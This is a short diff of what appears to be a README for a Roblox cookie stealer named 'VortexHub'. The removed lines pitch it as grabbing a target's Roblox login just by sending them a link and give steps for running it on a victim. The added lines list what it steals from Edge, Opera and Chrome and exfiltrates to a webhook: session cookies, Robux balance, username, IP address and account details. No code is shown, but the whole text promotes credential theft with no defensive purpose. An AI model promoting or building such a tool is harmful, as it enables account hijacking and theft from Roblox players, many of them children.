@@ -1,6 +1,10 @@
-Best New Cookie Stealer! Grabs The Roblox Cookie and All Their Info Just by Sending Them A Link
+Feautres:
 
-Run "VortexHub"
-Send To Target 
-Wait until Opened 
-Once the Target Opens. It Auto Detext Roblox Login and Grabs It Info For You
+🟢Grabs Cookie from (Edge,opera,chrome,etc.)
+🟢Sends Robux Balance to webhook
+🟢Sends Premium Status to webhook
+🟢Sends Roblox Username to webhook
+🟢Sends IP Address to webhook
+🟢Sends RAP to webhook
+🟢Sends Creation date to webhook
+🟢Sends Account age to webhook
